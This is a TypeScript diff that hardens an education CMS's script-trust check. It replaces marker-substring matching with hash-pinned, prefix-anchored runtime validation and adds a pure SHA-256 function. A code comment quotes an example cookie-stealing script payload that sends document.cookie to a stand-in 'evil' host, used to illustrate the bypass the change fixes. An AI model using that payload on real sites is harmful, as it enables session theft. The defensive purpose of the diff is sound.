@@ -31,10 +31,173 @@
  * the player's source-bound, key-resolved `educms-action` handler).
  */
 
-// VOS-CANVAS is the tiny __VOS_CW/__VOS_CH assignment injectDesignerLayoutEngine
-// bakes next to the fit engine — stripping it would under-apply the legibility
-// floor in scaled previews (the 2026-06-30 fix).
-const TRUSTED_SCRIPT_MARKERS = ['EDUCMS-SHIM-V6', 'VOS-FIT-ENGINE', 'VOS-STAGE-SCALE', 'VOS-CANVAS'];
+// ─────────────────────────────────────────────────────────────────────────
+// INJ-004 (2026-08-02) — TRUST IS ANCHORED TO STRUCTURE, NOT TO A SUBSTRING.
+//
+// The old rule was `block.indexOf(marker) !== -1`. That meant a single
+// COMMENT defeated both defences at once:
+//
+//     <script>fetch('https://evil/'+document.cookie) /* EDUCMS-SHIM-V6 */</script>
+//
+// …survived the strip AND got this render's CSP nonce stamped onto it, so the
+// `script-src 'nonce-…'` rule then AUTHORISED it. One attacker-controlled
+// comment turned the containment layer into a signing oracle.
+//
+// The rule now is:
+//   1. the marker must be the body's LEADING comment, at index 0 — an
+//      attacker cannot prepend code, and
+//   2. the body must be one we have actually shipped: SHA-256 equality
+//      against the registry below (or, for the one runtime whose body is
+//      parameterised, an exact structural match).
+//
+// FAIL-CLOSED: a marker-anchored block that matches no known body is treated
+// as untrusted and stripped. That is why the registry carries EVERY
+// historical body, not just the current one — `DESIGNER_LAYOUT_ENGINE` was
+// rewritten five times without bumping its marker, so boards persisted before
+// 2026-06-30 still carry an older fit engine and must keep working.
+// (`designer-safe-srcdoc.test.ts` recomputes the CURRENT bodies straight out
+// of apps/api/src/ai/designer-edit-shim.ts and fails if they drift out of the
+// registry — so the next engine change surfaces as a red test, never as a
+// silently un-shimmed board in production.)
+// ─────────────────────────────────────────────────────────────────────────
+
+type TrustedRuntime = {
+  marker: string;
+  /** SHA-256 of every body ever shipped under this marker. */
+  hashes?: string[];
+  /** Exact structural match, for a runtime whose body is parameterised. */
+  shape?: RegExp;
+  /** Hash of a body this module owns — resolved lazily so it can never drift. */
+  localBody?: () => string;
+};
+
+export const TRUSTED_RUNTIMES: TrustedRuntime[] = [
+  {
+    // apps/api/src/ai/designer-edit-shim.ts DESIGNER_EDIT_SHIM.
+    // Byte-stable since 043f8082 (verified across its full git history).
+    marker: 'EDUCMS-SHIM-V6',
+    hashes: ['cf2a1204382b12dc2978eee7ce0b62d0ffca6c49b6e133b130715acacc6c066b'],
+  },
+  {
+    // apps/api/src/ai/designer-edit-shim.ts DESIGNER_LAYOUT_ENGINE.
+    // Six distinct bodies shipped under the SAME marker — every one of them is
+    // baked into boards that are still persisted, so all are pinned.
+    marker: 'VOS-FIT-ENGINE',
+    hashes: [
+      'c45a887c7d9e5657896a69ab228b7efb552a45b834926bee9d0b0ddb4ee0204e', // current (7d06e59b)
+      '71ab636ca6a942a1819440d9c74369b0adf070f872caf46fdd73d9b23c64b063', // 6459b0be
+      '3b9244a003408266694ac0f207feb94814f69668ca33c656ee9240a01dbc59ba', // 8ca38f6c
+      '0b46ddb65ab8f3ac16bd1bdee704644cf0d145819fc4a8c7abf6c92f803e0f2f', // 1a05768f
+      '5e3f6415493d54c9e10c2d5485f33a258b6231b3f477d56787e6d8f4cc53835c', // 1d98ae0e
+    ],
+  },
+  {
+    // Owned by THIS file — hashed from the constant at call time, so it is
+    // structurally impossible for it to drift out of the registry.
+    marker: 'VOS-STAGE-SCALE',
+    localBody: () => STAGE_SCALE_RUNTIME,
+  },
+  {
+    // The tiny per-board canvas-dims assignment injectDesignerLayoutEngine
+    // bakes next to the fit engine (stripping it would under-apply the
+    // legibility floor in scaled previews — the 2026-06-30 fix). Its body
+    // carries the board's pixel dimensions, so it is validated by exact
+    // shape rather than by hash. The regex is fully anchored and admits
+    // nothing but two integer assignments.
+    marker: 'VOS-CANVAS',
+    shape: /^\/\*VOS-CANVAS\*\/window\.__VOS_CW=\d{1,6};(?:window\.__VOS_CH=\d{1,6};)?$/,
+  },
+];
+
+// ─── SHA-256 (synchronous, ES5, Chromium-83 safe) ────────────────────────
+// `crypto.subtle.digest` is async and this transform must stay a pure sync
+// string function (it runs inside a useMemo on the render path). ~60 lines of
+// vanilla SHA-256 instead. Correctness is pinned by a test that compares this
+// against node's own crypto over a spread of inputs including multi-byte and
+// astral-plane characters.
+const SHA256_K = [
+  0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
+  0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
+  0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
+  0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
+  0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
+  0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
+  0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
+  0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
+];
+
+function utf8Bytes(str: string): number[] {
+  const out: number[] = [];
+  for (let i = 0; i < str.length; i++) {
+    const c = str.charCodeAt(i);
+    if (c < 0x80) {
+      out.push(c);
+    } else if (c < 0x800) {
+      out.push(0xc0 | (c >> 6), 0x80 | (c & 63));
+    } else if (c >= 0xd800 && c <= 0xdbff && i + 1 < str.length) {
+      const c2 = str.charCodeAt(i + 1);
+      if (c2 >= 0xdc00 && c2 <= 0xdfff) {
+        const cp = 0x10000 + ((c - 0xd800) << 10) + (c2 - 0xdc00);
+        out.push(0xf0 | (cp >> 18), 0x80 | ((cp >> 12) & 63), 0x80 | ((cp >> 6) & 63), 0x80 | (cp & 63));
+        i++;
+      } else {
+        out.push(0xe0 | (c >> 12), 0x80 | ((c >> 6) & 63), 0x80 | (c & 63));
+      }
+    } else {
+      out.push(0xe0 | (c >> 12), 0x80 | ((c >> 6) & 63), 0x80 | (c & 63));
+    }
+  }
+  return out;
+}
+
+export function sha256Hex(input: string): string {
+  const bytes = utf8Bytes(input);
+  const bitLen = bytes.length * 8;
+  bytes.push(0x80);
+  while (bytes.length % 64 !== 56) bytes.push(0);
+  const hi = Math.floor(bitLen / 4294967296);
+  const lo = bitLen % 4294967296;
+  bytes.push((hi >>> 24) & 255, (hi >>> 16) & 255, (hi >>> 8) & 255, hi & 255);
+  bytes.push((lo >>> 24) & 255, (lo >>> 16) & 255, (lo >>> 8) & 255, lo & 255);
+
+  const H = [0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19];
+  const w = new Array<number>(64);
+  const rotr = (x: number, n: number) => (x >>> n) | (x << (32 - n));
+
+  for (let off = 0; off < bytes.length; off += 64) {
+    for (let i = 0; i < 16; i++) {
+      w[i] =
+        ((bytes[off + i * 4] << 24) |
+          (bytes[off + i * 4 + 1] << 16) |
+          (bytes[off + i * 4 + 2] << 8) |
+          bytes[off + i * 4 + 3]) >>> 0;
+    }
+    for (let i = 16; i < 64; i++) {
+      const s0 = rotr(w[i - 15], 7) ^ rotr(w[i - 15], 18) ^ (w[i - 15] >>> 3);
+      const s1 = rotr(w[i - 2], 17) ^ rotr(w[i - 2], 19) ^ (w[i - 2] >>> 10);
+      w[i] = (w[i - 16] + s0 + w[i - 7] + s1) >>> 0;
+    }
+    let a = H[0], b = H[1], c = H[2], d = H[3], e = H[4], f = H[5], g = H[6], h = H[7];
+    for (let i = 0; i < 64; i++) {
+      const S1 = rotr(e, 6) ^ rotr(e, 11) ^ rotr(e, 25);
+      const ch = (e & f) ^ (~e & g);
+      const t1 = (h + S1 + ch + SHA256_K[i] + w[i]) >>> 0;
+      const S0 = rotr(a, 2) ^ rotr(a, 13) ^ rotr(a, 22);
+      const maj = (a & b) ^ (a & c) ^ (b & c);
+      const t2 = (S0 + maj) >>> 0;
+      h = g; g = f; f = e;
+      e = (d + t1) >>> 0;
+      d = c; c = b; b = a;
+      a = (t1 + t2) >>> 0;
+    }
+    H[0] = (H[0] + a) >>> 0; H[1] = (H[1] + b) >>> 0; H[2] = (H[2] + c) >>> 0; H[3] = (H[3] + d) >>> 0;
+    H[4] = (H[4] + e) >>> 0; H[5] = (H[5] + f) >>> 0; H[6] = (H[6] + g) >>> 0; H[7] = (H[7] + h) >>> 0;
+  }
+
+  let hex = '';
+  for (let i = 0; i < 8; i++) hex += ('00000000' + H[i].toString(16)).slice(-8);
+  return hex;
+}
 
 /** Chromium-83-safe (no crypto.randomUUID there). CSP nonces just need to be unguessable-per-render. */
 function makeNonce(): string {
@@ -85,9 +248,35 @@ const STAGE_SCALE_RUNTIME =
   'if(document.fonts&&document.fonts.ready&&document.fonts.ready.then){document.fonts.ready.then(function(){fit();});}' +
   '}catch(e){}})();';
 
-function isTrustedScriptBlock(block: string): boolean {
-  for (const marker of TRUSTED_SCRIPT_MARKERS) {
-    if (block.indexOf(marker) !== -1) return true;
+/**
+ * Is this `<script …>…</script>` block one of OUR baked runtimes, byte for
+ * byte?
+ *
+ * Anchored on structure, never on "contains a marker somewhere":
+ *   • the block must be a well-formed script element,
+ *   • its body must OPEN with `/*MARKER*<!---->/` at index 0 (no leading
+ *     whitespace, nothing before it), and
+ *   • the whole body must hash to a runtime we shipped, or match that
+ *     runtime's exact structural shape.
+ *
+ * Anything else — including a block that merely mentions a marker in a
+ * comment — is untrusted and gets stripped by the caller.
+ */
+export function isTrustedScriptBlock(block: string): boolean {
+  const m = block.match(/^<script\b[^>]*>([\s\S]*)<\/script\s*>$/i);
+  if (!m) return false;
+  const body = m[1];
+  for (const rt of TRUSTED_RUNTIMES) {
+    const prefix = '/*' + rt.marker + '*/';
+    // Leading-comment anchor. `indexOf(prefix) === 0` (not `!== -1`) is the
+    // whole point of this rewrite — do not loosen it.
+    if (body.indexOf(prefix) !== 0) continue;
+    if (rt.shape) return rt.shape.test(body);
+    const digest = sha256Hex(body);
+    if (rt.localBody && digest === sha256Hex(rt.localBody())) return true;
+    if (rt.hashes && rt.hashes.indexOf(digest) !== -1) return true;
+    // Marker matched but the body is not one we shipped → FAIL CLOSED.
+    return false;
   }
   return false;
 }
